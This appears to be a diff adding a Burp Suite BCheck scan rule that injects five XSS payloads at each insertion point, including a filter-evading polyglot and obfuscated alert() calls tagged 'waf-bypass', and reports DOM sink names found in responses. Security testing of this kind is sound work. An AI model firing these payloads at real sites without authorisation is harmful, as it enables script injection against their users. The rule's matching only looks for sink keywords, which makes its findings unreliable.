@@ -1,0 +1,24 @@
+metadata:
+    language: v2-beta
+    name: "XSS - DOM Based Sink Detection"
+    description: "Detects DOM XSS by injecting payloads targeting common DOM sinks like innerHTML, document.write, eval"
+    author: "BCheck Arsenal"
+    tags: "xss", "dom", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "jaVaScRiPt:/*-/*\x27/*\"/*\x60/*<sVg/*/oNlOaD=alert()//>'"
+            - "${alert(document.domain)}"
+            - "'-alert(1)-'"
+            - "</sCrIpT><sCrIpT>alert(1)</sCrIpT>"
+            - "\";window['al'+'ert'](1);//"
+
+    if {check.response} matches "(innerHTML|document\.write|eval\(|\.innerHTML|outerHTML|insertAdjacentHTML)" then
+        report issue:
+            severity: medium
+            confidence: tentative
+            detail: "Potential DOM-based XSS detected. The response contains DOM sink patterns that may process user-controlled input."
+            remediation: "Avoid dangerous DOM sinks. Use textContent instead of innerHTML. Sanitize all client-side input."
+    end if
